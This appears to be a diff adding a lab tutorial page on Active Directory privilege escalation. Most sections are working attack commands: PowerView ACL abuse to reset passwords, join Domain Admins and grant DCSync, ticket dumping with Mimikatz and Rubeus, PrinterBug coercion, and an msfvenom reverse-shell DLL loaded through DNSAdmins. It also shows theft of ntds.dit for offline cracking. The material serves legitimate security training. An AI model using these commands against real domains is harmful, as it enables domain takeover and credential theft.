@@ -1,0 +1,149 @@
+---
+title: "Tut04: Privilege Escalation in AD"
+---
+
+Privilege escalation in an Active Directory environment means moving from a standard user or local admin account to a highly privileged domain account—ideally Domain Admin or Enterprise Admin. Many paths exist through misconfigured permissions, delegation, and ACL abuse.
+
+## Identify Your Current Rights
+
+Always start by confirming who you are and what groups you belong to:
+
+```powershell
+whoami /all
+net user <username> /domain
+```
+
+## ACL-Based Privilege Escalation
+
+Active Directory stores Access Control Lists (ACLs) on every object. Misconfigured ACLs let standard users modify other objects—including resetting passwords, adding group members, or taking ownership.
+
+### Finding Dangerous ACLs with BloodHound
+
+In BloodHound, look for edges such as:
+- **GenericAll** — full control over the object
+- **GenericWrite** — can write to specific attributes
+- **WriteOwner** — can change the object's owner
+- **WriteDACL** — can modify the object's ACL
+- **ForceChangePassword** — can reset the user's password without knowing the current one
+- **AddMember** — can add members to a group
+
+BloodHound query: **Find Principals with DCSync Rights** and **Find Shortest Paths to Domain Admins** both surface ACL paths.
+
+### Abusing GenericAll on a User (Reset Password)
+
+```powershell
+# PowerView: reset a user's password with GenericAll
+$newpassword = ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity target.user -AccountPassword $newpassword
+```
+
+### Abusing AddMember on a Group
+
+```powershell
+# Add yourself to a privileged group
+Add-DomainGroupMember -Identity "Domain Admins" -Members current.user
+```
+
+### Abusing WriteDACL (Grant Yourself DCSync)
+
+```powershell
+# Grant yourself DCSync rights on the domain
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity current.user -Rights DCSync
+```
+
+Then run DCSync (see Tutorial 05).
+
+## Kerberos Delegation Abuse
+
+Delegation allows a service to authenticate to other services on behalf of a user.
+
+### Unconstrained Delegation
+
+Machines with Unconstrained Delegation cache every TGT that authenticates to them. If you compromise such a machine, you can extract all cached tickets.
+
+```powershell
+# Find machines with Unconstrained Delegation (PowerView)
+Get-DomainComputer -Unconstrained | Select-Object name,dnshostname
+
+# Wait for or coerce a privileged user to authenticate to the machine
+# Then dump tickets with Mimikatz
+sekurlsa::tickets /export
+
+# Or with Rubeus
+.\Rubeus.exe triage
+.\Rubeus.exe dump /user:administrator /nowrap
+```
+
+Force a Domain Controller to authenticate using the **Print Spooler** bug (PrinterBug):
+
+```sh
+# Coerce DC01 to authenticate to your compromised machine
+impacket-printerbug corp.local/user:Password123@dc01.corp.local compromised.corp.local
+```
+
+### Constrained Delegation
+
+Constrained Delegation limits which services a machine can delegate to. If you control a service with constrained delegation, you can impersonate any user against the allowed services.
+
+```sh
+# Find accounts with constrained delegation (Impacket)
+impacket-findDelegation corp.local/user:Password123 -dc-ip 192.168.1.10
+
+# Request a TGS impersonating administrator
+.\Rubeus.exe s4u /user:svc_web /rc4:<hash> /impersonateuser:administrator /msdsspn:"cifs/fileserver.corp.local" /ptt
+```
+
+## DNSAdmins Privilege Escalation
+
+Members of the `DNSAdmins` group can load a DLL into the DNS service, which runs as SYSTEM.
+
+```sh
+# Build a malicious DLL (use msfvenom or a custom DLL)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f dll -o payload.dll
+
+# Host the DLL on an SMB share
+impacket-smbserver share /path/to/dll -smb2support
+
+# As a member of DNSAdmins, configure the plugin
+dnscmd dc01.corp.local /config /serverlevelplugindll \\192.168.1.5\share\payload.dll
+
+# Restart the DNS service (requires restarting service)
+sc stop dns
+sc start dns
+```
+
+## SeBackupPrivilege
+
+The `Backup Operators` group holds `SeBackupPrivilege`, which allows reading any file regardless of permissions.
+
+```powershell
+# Copy ntds.dit (requires diskshadow or robocopy with privilege)
+diskshadow.exe /s C:\shadow.txt
+
+# shadow.txt contents:
+# set verbose on
+# set metadata C:\Windows\Temp\meta.cab
+# set context clientaccessible
+# begin backup
+# add volume C: alias sysvol
+# create
+# expose %sysvol% X:
+# end backup
+# exit
+
+robocopy /b X:\Windows\NTDS\ C:\Temp\ ntds.dit
+reg save hklm\system C:\Temp\system.hive
+
+# Then exfiltrate and crack offline with secretsdump
+impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
+```
+
+## Task
+
+> **[Task]** In your AD lab, use BloodHound to find an ACL-based privilege escalation path from your user to a higher-privileged account. Execute the attack and gain the new account. Identify one additional technique (delegation or DNSAdmins) and describe how you would execute it against your lab.
+
+## Reference
+
+- [ired.team - ACL Abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+- [ired.team - Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-kerberos-delegation)
+- [HackTricks - AD Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
